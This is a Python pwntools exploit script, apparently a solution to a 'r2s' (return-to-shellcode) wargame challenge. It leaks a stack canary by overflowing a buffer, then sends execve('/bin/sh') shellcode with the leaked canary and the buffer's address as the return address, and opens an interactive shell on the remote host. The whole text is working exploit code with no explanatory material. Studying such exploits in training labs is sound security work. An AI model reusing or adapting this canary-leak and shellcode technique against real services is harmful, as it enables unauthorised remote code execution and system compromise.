from pwn import *
#p = process('./r2s')
p = remote(ADDRESS, PORT)
context.arch = 'amd64' 
p.recvuntil(b'buf: ')
buf_address = int(p.recvline()[:-1], 16)
p.recvuntil(b': ')
distance_buf_rbp = int(p.recvline())
canary_pos = distance_buf_rbp - 8
payload = b"A" * (canary_pos + 1)
p.sendafter(b"Input: ", payload)
p.recvuntil(payload)
canary = u64(b'\x00' + p.recvn(7))
shellcode = b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
payload = shellcode + (canary_pos - len(shellcode)) * b"A" + p64(canary) + b"B" * 8 + p64(buf_address)
p.sendlineafter(b"Input: ", payload)
p.interactive()